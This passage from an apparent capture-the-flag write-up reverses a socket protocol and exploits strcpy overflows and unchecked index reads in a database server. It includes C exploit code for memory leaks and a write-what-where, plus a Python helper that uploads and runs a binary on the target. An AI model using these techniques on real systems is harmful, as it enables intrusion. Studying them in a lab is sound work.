    <span class="k">if</span> <span class="p">(</span> <span class="n">write</span><span class="p">(</span><span class="n">socketfd</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x10DuLL</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x10D</span> <span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">fwrite</span><span class="p">(</span><span class="s">"proto: bad send to sock</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>From the respective offsets in the buffer, the package structure can be derived to something like this:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">PackageContent</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">action</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">255</span><span class="p">];</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">Package</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">checksum</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">header</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">PackageContent</span> <span class="n">content</span><span class="p">;</span>  
<span class="p">};</span></code></pre></figure>

<p>Won’t go through the complete reversing of the client and server communication now, but to sum it up</p>

<ul>
  <li>The server creates a socket <code class="language-plaintext highlighter-rouge">secretSock</code>, on which he waits for connections</li>
  <li>The client connects to the socket <code class="language-plaintext highlighter-rouge">secretSock</code> and sends a request package
    <ul>
      <li>Action 1: Ping</li>
      <li>Action 2: Check if entry (from payload) exists in server database</li>
      <li>Action 3: Read entry from index (specified in payload)</li>
      <li>Action 4: Check if db is empty (byte at <code class="language-plaintext highlighter-rouge">addr == 0x0</code> ) and answer with flag, if it’s empty</li>
    </ul>
  </li>
</ul>

<p>With this, we can start writing our own client for communicating with the server.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;zlib.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>

<span class="k">struct</span> <span class="n">PackageContent</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">action</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">255</span><span class="p">];</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">Package</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">checksum</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">header</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">PackageContent</span> <span class="n">content</span><span class="p">;</span>  
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">initConnection</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">socketName</span> <span class="o">=</span> <span class="s">"secretSock"</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">addr</span><span class="p">;</span>

    <span class="c1">// Create socket</span>
    <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    
    <span class="c1">// Connect to socket</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="p">));</span>

    <span class="n">addr</span><span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">addr</span><span class="p">.</span><span class="n">sa_data</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">socketName</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">socketName</span><span class="p">));</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Error on socket connect</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>       
    <span class="p">}</span>   
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">sendPackage</span><span class="p">(</span><span class="k">struct</span> <span class="n">Package</span><span class="o">*</span> <span class="n">pkg</span><span class="p">,</span> <span class="k">struct</span> <span class="n">PackageContent</span><span class="o">*</span> <span class="n">answer</span><span class="p">,</span> <span class="kt">char</span> <span class="n">action</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Initialize package</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">Package</span><span class="p">));</span>

    <span class="n">strcpy</span><span class="p">(</span><span class="n">pkg</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">,</span> <span class="s">"</span><span class="se">\x44\x41\x37\x37\x37</span><span class="s">"</span><span class="p">);</span>     <span class="c1">// Set header</span>

    <span class="n">pkg</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">action</span> <span class="o">=</span> <span class="n">action</span><span class="p">;</span>                    <span class="c1">// set package action</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">pkg</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">payload</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>      <span class="c1">// Set package payload</span>
    
    <span class="c1">// Create package checksum</span>
    <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">adler32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">pkg</span><span class="o">-&gt;</span><span class="n">checksum</span> <span class="o">=</span> <span class="n">adler32</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pkg</span><span class="p">,</span> <span class="mh">0x10d</span><span class="p">);</span>
    
    <span class="c1">// Send to server</span>
    <span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">pkg</span><span class="p">,</span> <span class="mh">0x10d</span><span class="p">);</span>

    <span class="c1">// Read server response</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">answer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">PackageContent</span><span class="p">));</span>
    <span class="n">read</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="mh">0x10d</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">Package</span> <span class="n">pkg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">PackageContent</span> <span class="n">answer</span><span class="p">;</span>

    <span class="n">initConnection</span><span class="p">();</span>

    <span class="n">sendPackage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">answer</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Back to reversing the server binary. When it receives a package from the client with a hash, it will <code class="language-plaintext highlighter-rouge">mmap</code> the database file into memory and check, if it can find the hash from the received package in it:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">mmap_database</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">addr</span> <span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/opt/db/base"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">...</span>
    <span class="n">len</span> <span class="o">=</span> <span class="n">stat_buf</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">stat_buf</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">...</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">check_entry</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">package_content</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="kt">long</span> <span class="n">offset</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp_buffer</span><span class="p">;</span>
  
    <span class="n">mmap_database</span><span class="p">();</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">tmp_buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">package_content</span><span class="p">);</span>    <span class="c1">// Another buffer overflow</span>

    <span class="k">do</span>
    <span class="p">{</span>
        <span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">tmp_buffer</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFF0</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">[</span><span class="n">offset</span><span class="p">]);</span>

        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">tmp_buffer</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span> <span class="p">)</span>
            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">33</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="n">offset</span><span class="p">]);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>If the database isn’t already mapped, it will open the file <code class="language-plaintext highlighter-rouge">/opt/db/base</code> and maps its content to a memory region. After that, it will copy our package content into a buffer and then search through the mapped area, comparing the found hashes with our payload.</p>

<p>But by copying the package content into a buffer of only 32 bytes size, we have another overflow, which allows us to overwrite for one the <code class="language-plaintext highlighter-rouge">offset</code>, at which it looks for the hash to compare and also the <code class="language-plaintext highlighter-rouge">tmp_buffer</code> pointer, into which it will copy the hash.</p>

<p>Since the offset isn’t checked for correct range, we can use this to read outside of the mapped region. And by overwriting <code class="language-plaintext highlighter-rouge">tmp_buffer</code>, we can write that value to an arbitrary address. Though, since <code class="language-plaintext highlighter-rouge">strcpy</code> is used, no null bytes are allowed in our payload, so we cannot use completely arbitrary values for overwriting <code class="language-plaintext highlighter-rouge">offset</code> (or we’ll lose the possibility to overwrite <code class="language-plaintext highlighter-rouge">tmp_buffer</code>).</p>

<p>Since I asummed <code class="language-plaintext highlighter-rouge">aslr</code> would be active on the server, we’d need some leaks before being able to do something useful with this (which turned out as a wrong assumption later on, but well…).</p>

<p>Let’s see what action <code class="language-plaintext highlighter-rouge">3</code> will do:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span> <span class="n">pkg</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">action</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">response</span> <span class="o">=</span> <span class="n">read_from_index</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">pkg</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">payload</span><span class="p">);</span>
    <span class="n">send_to_client</span><span class="p">(</span><span class="n">listener_socket</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">response</span><span class="p">);</span>
<span class="p">}</span>

<span class="p">...</span>

<span class="kt">char</span> <span class="o">*</span> <span class="nf">read_from_index</span><span class="p">(</span><span class="kt">long</span> <span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">[</span><span class="mi">33</span> <span class="o">*</span> <span class="n">ofset</span><span class="p">];</span>
<span class="p">}</span></code></pre></figure>

<p>Again, no range check, which means we can also specify out of bounds value here.</p>

<p>Whilst it might not be too obvious: if this is the first request to the server, <code class="language-plaintext highlighter-rouge">addr</code> won’t be initialized (thus it’s <code class="language-plaintext highlighter-rouge">0x0</code>), so we can do direct reads with it, without knowing the address of the mapped region (which would be a problem with <code class="language-plaintext highlighter-rouge">aslr</code>).</p>

<p>I used that to leak <code class="language-plaintext highlighter-rouge">bss</code>, so I’d have at least some libc addresses at hand.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">setval</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">buffer</span><span class="o">+</span><span class="n">offset</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">read_index</span><span class="p">(</span><span class="k">struct</span> <span class="n">Package</span> <span class="o">*</span><span class="n">pkg</span><span class="p">,</span> <span class="k">struct</span> <span class="n">PackageContent</span> <span class="o">*</span><span class="n">answer</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    
    <span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
    <span class="n">sendPackage</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">crash_service</span><span class="p">(</span><span class="k">struct</span> <span class="n">Package</span> <span class="o">*</span><span class="n">pkg</span><span class="p">,</span> <span class="k">struct</span> <span class="n">PackageContent</span> <span class="o">*</span><span class="n">answer</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>

    <span class="n">sendPackage</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">long</span> <span class="nf">get_from_offset</span><span class="p">(</span><span class="k">struct</span> <span class="n">PackageContent</span> <span class="o">*</span><span class="n">answer</span><span class="p">,</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">answer</span><span class="o">-&gt;</span><span class="n">payload</span> <span class="o">+</span> <span class="n">offset</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">leak_bss</span><span class="p">(</span><span class="k">struct</span> <span class="n">Package</span> <span class="o">*</span><span class="n">pkg</span><span class="p">,</span> <span class="k">struct</span> <span class="n">PackageContent</span> <span class="o">*</span><span class="n">answer</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">read_index</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="mh">0x603000</span><span class="o">/</span><span class="mh">0x21</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">200</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%p | "</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">get_from_offset</span><span class="p">(</span><span class="n">answer</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">Package</span> <span class="n">pkg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">PackageContent</span> <span class="n">answer</span><span class="p">;</span>

    <span class="n">initConnection</span><span class="p">();</span>

    <span class="n">leak_bss</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Since the database must not be initialized to use the direct leak, <code class="language-plaintext highlighter-rouge">crash_service</code> can be used to restart the service to make sure <code class="language-plaintext highlighter-rouge">addr</code> is not initialized.</p>

<p>Testing it locally gave:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ gcc xpl_client.c -lz -o xpl &amp;&amp; ./xpl
(nil) | (nil) | 0x602e18 | 0x7ffff7ffe170 | 0x7ffff7def210 | 0x7ffff78b47a0 | 0x4009b6 | 0x7ffff7888f90 | 
0x7ffff78fb720 | 0x7ffff78a0650 | 0x4009f6 | 0x400a06 | 0x7ffff79491d0 | 0x7ffff78fbce0 | 0x7ffff78fb6c0 | 
0x7ffff78401f0 | 0x400a56 | 0x400a66 | 0x7ffff7bc12c0 | 0x400a86 | 0x7ffff79098c0 | 0x400aa6 | 0x7ffff79097a0 
| 0x400ac6 | 0x7ffff7909740 | </code></pre></figure>

<p>For testing on the server, I adjusted the exploit script, so it will upload our compiled exploit to the server (similar to leaking in the first stage, just the other way round now) and execute it on the server.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">execute_on_server</span><span class="p">(</span><span class="n">srcfile</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">srcfile</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

    <span class="n">bdata</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">'echo "%s" &gt; /tmp/b64src'</span> <span class="o">%</span> <span class="n">bdata</span><span class="p">)</span>
    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">'cat /tmp/b64src | base64 -d &gt; /tmp/b64out'</span><span class="p">)</span>
    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">'chmod +x /tmp/b64out'</span><span class="p">)</span>

    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">"/tmp/b64out"</span><span class="p">)</span>

    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">"rm /tmp/b64src"</span><span class="p">)</span>
    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">"rm /tmp/b64out"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">SESSION</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">update</span><span class="p">({</span> <span class="s">"Content-Type"</span> <span class="p">:</span> <span class="s">"application/json"</span><span class="p">})</span>
            
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"gcc xpl_client.c -lz -o xpl"</span><span class="p">)</span>

    <span class="n">execute_on_server</span><span class="p">(</span><span class="s">"xpl"</span><span class="p">)</span>
    
    <span class="k">return</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl_ex3.py 
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"(nil) | (nil) | 0x602e18 | 0x7ffff7ffe170 | 0x7ffff7def210 | 0x7ffff78b47a0 | 0x4009b6 |
 0x4009c6 | 0x4009d6 | 0x7ffff78a0650 | 0x4009f6 | 0x400a06 | 0x7ffff7949230 | 0x7ffff78fbce0 | 0x7ffff78fb6c0 |
 0x7ffff78401f0 | 0x400a56 | 0x400a66 | 0x7ffff7bc12c0 | 0x400a86 | 0x7ffff79098c0 | 0x400aa6 | 0x7ffff79097a0 |
 0x400ac6 | 0x7ffff7909740 | w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}</code></pre></figure>

<p>Wait, what? There’s no <code class="language-plaintext highlighter-rouge">aslr</code> active on the server…</p>

<p>Ok, this should make it easier to exploit it via <code class="language-plaintext highlighter-rouge">check_entry</code>. Though the mapped region on the remote server was off by <code class="language-plaintext highlighter-rouge">0x1000</code> to my local one, I found it at <code class="language-plaintext highlighter-rouge">0x00007ffff7ff3000</code> after some more leaking. With this knowledge, we can calculate the proper offsets to have an somewhat write-what-where.</p>

<p>Since the mapped region address contained a null byte, it wasn’t usable in the payload, since <code class="language-plaintext highlighter-rouge">strcpy</code> would just stop at that null byte (at least, that’s what I was thinking at that point).</p>

<p>So, my first approach was to overwrite <code class="language-plaintext highlighter-rouge">addr</code> itself to point to some null pointer instead of the database string, but that turned out quite difficult, since</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">strcpy((char *)(tmp_buffer &amp; 0xFFFFFFFFFFFFFFF0), &amp;addr[offset]);</code></pre></figure>

<p>would align that <code class="language-plaintext highlighter-rouge">strcpy</code>. Since <code class="language-plaintext highlighter-rouge">addr</code> was located at <code class="language-plaintext highlighter-rouge">0x603108</code> we would need an 8 byte string followed by a valid address (since we could only copy to <code class="language-plaintext highlighter-rouge">0x603100</code>).</p>

<p>While wasting some hours on this approach (which should pay off for the next stage though), it struck me, that exactly this <code class="language-plaintext highlighter-rouge">&amp; 0xF0</code> which harrassed me the whole time, can be used to write to the mapped region. Since it sets the LSB to <code class="language-plaintext highlighter-rouge">0</code>, we can just pass an offset there and it will be set back to the start of the mapped area (facepalm moment…).</p>

<p>This means, we’d just have to find some address containing a null byte and copy it to the mapped region. Since <code class="language-plaintext highlighter-rouge">strcpy</code> terminates the copy with a null byte, it would just overwrite the byte at <code class="language-plaintext highlighter-rouge">addr</code> with 0x0.</p>

<p>Piece of cake compared to the initial approach.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">Package</span> <span class="n">pkg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">PackageContent</span> <span class="n">answer</span><span class="p">;</span>

    <span class="n">initConnection</span><span class="p">();</span>

    <span class="c1">// Initialize database</span>
    <span class="n">sendPackage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Send package to overwrite LSB at mapped region</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>

    <span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mh">0xffffffffffbc66c0</span><span class="p">);</span>      <span class="c1">// Negative offset from mapped region pointing into libc bss</span>
    <span class="n">setval</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mh">0x7ffff7ff3004</span><span class="p">);</span>          <span class="c1">// Destination address, will be cropped to 0x7ffff7ff3000</span>

    <span class="n">sendPackage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>

    <span class="c1">// Request empty db check</span>
    <span class="n">sendPackage</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pkg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">answer</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">answer</span><span class="p">.</span><span class="n">payload</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl_ex3.py 
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"flag{twistl0ck_fin4l_fl4g_!!!} w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}</code></pre></figure>

<p>The final flag, we arrived at the end? At that point, it got quite late and I had to get some sleep.</p>

<p>Just to notice the next morning, <a href="https://devcraft.io/">vakzz</a> has reached <code class="language-plaintext highlighter-rouge">0xffff</code>. Props to vakzz for digging deeper :)</p>

<h2 id="challenge-4-get-root-rce-and-find-the-hidden-flag">Challenge 4: Get root rce and find the hidden flag</h2>

<blockquote>
